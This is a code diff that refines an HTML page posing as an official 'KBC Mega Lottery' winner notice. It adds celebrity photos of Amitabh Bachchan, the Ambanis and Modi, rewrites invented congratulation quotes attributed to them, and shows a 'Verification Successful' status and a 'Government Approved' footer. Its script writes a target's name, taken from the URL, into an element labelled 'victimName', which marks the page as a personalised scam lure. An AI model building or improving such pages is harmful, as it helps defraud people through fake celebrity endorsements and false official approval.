@@ -5,26 +5,35 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>KBC Official Winner</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #000; color: #fff; text-align: center; margin: 0; padding: 10px; }
-        .container { max-width: 500px; margin: auto; background: linear-gradient(180deg, #1a1a1a 0%, #000 100%); padding: 20px; border: 4px solid #ffd700; border-radius: 20px; }
-        .logo { width: 120px; border-radius: 50%; border: 3px solid #ffd700; }
-        h1 { color: #ffd700; margin: 10px 0; font-size: 26px; }
-        .celebrity-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }
-        .celeb { width: 100%; height: 80px; object-fit: cover; border-radius: 10px; border: 1px solid #ffd700; }
-        .msg-box { background: #333; padding: 15px; border-radius: 10px; margin: 15px 0; font-style: italic; font-size: 14px; border-left: 4px solid #ffd700; }
-        .winner-box { background: #ffd700; color: #000; padding: 15px; border-radius: 10px; font-weight: bold; margin: 20px 0; }
-        .footer { font-size: 10px; color: #666; }
+        body { font-family: 'Arial', sans-serif; background: #000; color: #fff; text-align: center; margin: 0; padding: 15px; }
+        .container { max-width: 500px; margin: auto; background: linear-gradient(180deg, #1a1a1a 0%, #000 100%); padding: 20px; border: 4px solid #ffd700; border-radius: 20px; box-shadow: 0 0 20px rgba(255, 215, 0, 0.3); }
+        
+        /* Logo Fix */
+        .logo { width: 130px; height: 130px; border-radius: 50%; border: 3px solid #ffd700; background: #fff; margin-bottom: 10px; }
+        
+        h1 { color: #ffd700; margin: 5px 0; font-size: 24px; text-transform: uppercase; }
+        
+        /* Celebrity Images Fix */
+        .celebrity-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 20px 0; }
+        .celeb { width: 100%; height: 90px; object-fit: cover; border-radius: 8px; border: 2px solid #ffd700; }
+        
+        .msg-box { background: #222; padding: 12px; border-radius: 10px; margin: 10px 0; font-size: 13px; border-left: 4px solid #ffd700; text-align: left; }
+        .winner-box { background: #ffd700; color: #000; padding: 15px; border-radius: 10px; font-weight: bold; margin: 20px 0; font-size: 18px; }
+        
+        .footer { font-size: 10px; color: #666; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/en/b/b5/Kaun_Banega_Crorepatititlecard.jpg" class="logo" alt="KBC">
+        <!-- KBC Official Logo -->
+        <img src="https://i.imgur.com/7H6s6xG.png" class="logo" alt="KBC Logo">
+        
         <h1>KBC Mega Lottery</h1>
         
         <div class="celebrity-grid">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/9/90/Amitabh_Bachchan_promoting_Thugs_of_Hindostan.jpg" class="celeb">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/0/07/Mukesh_Ambani_at_the_2018_Antilia_party.jpg" class="celeb">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/e/ed/Prime_Minister_Modi.jpg" class="celeb">
+            <img src="https://i.imgur.com/8QGZtM8.jpg" class="celeb" alt="Amitabh">
+            <img src="https://i.imgur.com/w4pXgRz.jpg" class="celeb" alt="Ambani">
+            <img src="https://i.imgur.com/4JvG9hK.jpg" class="celeb" alt="Modi">
         </div>
 
         <div class="winner-box">
@@ -34,15 +43,16 @@
         </div>
 
         <div class="msg-box">
-            "Congratulations to our lucky winner! May this prize bring prosperity to your family." – Amitabh Bachchan
+            <b>Amitabh Bachchan:</b> "Bahut bahut badhai! Aapki kismat chamak gayi hai."
         </div>
         <div class="msg-box">
-            "We are proud to support such initiatives for the people." – Mukesh & Nita Ambani
+            <b>Nita Ambani:</b> "We congratulate the winner for this historic achievement."
         </div>
 
-        <p style="color: #0f0;">Status: Approved by Head Office</p>
+        <p style="color: #0f0; font-weight: bold;">Status: Verification Successful ✅</p>
         <div class="footer">© 2026 KBC Official Lottery Portal. Government Approved.</div>
     </div>
+    
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         document.getElementById('victimName').innerText = decodeURIComponent(urlParams.get('name') || "Respected User");
